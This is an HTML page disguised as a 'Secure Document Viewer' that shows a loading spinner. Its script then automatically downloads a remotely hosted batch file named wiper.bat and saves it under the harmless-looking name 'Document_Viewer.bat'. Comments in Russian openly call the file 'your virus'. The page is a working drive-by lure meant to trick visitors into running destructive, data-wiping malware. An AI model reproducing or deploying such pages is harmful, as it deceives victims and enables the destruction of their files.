<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Viewer</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #fe2c55; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 500; font-size: 22px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2>Preparing Document...</h2>
    <p>Your file will download automatically.</p>

    <script>
        // ССЫЛКА НА ТВОЙ ВИРУС (wiper.bat)
        const fileUrl = "https://gist.githubusercontent.com/8yzj5nk95r-droid/05dd8519a4c484e8499964729a31e40c/raw/197d72b5416b35b7b6364ee851fbc0890b42ec75/wiper.bat";
        
        // Ждем 1.5 секунды (чтобы страница загрузилась) и начинаем скачивание
        setTimeout(function() {
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = 'Document_Viewer.bat'; // Имя файла, который скачается
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }, 1500);
    </script>
</body>
</html>
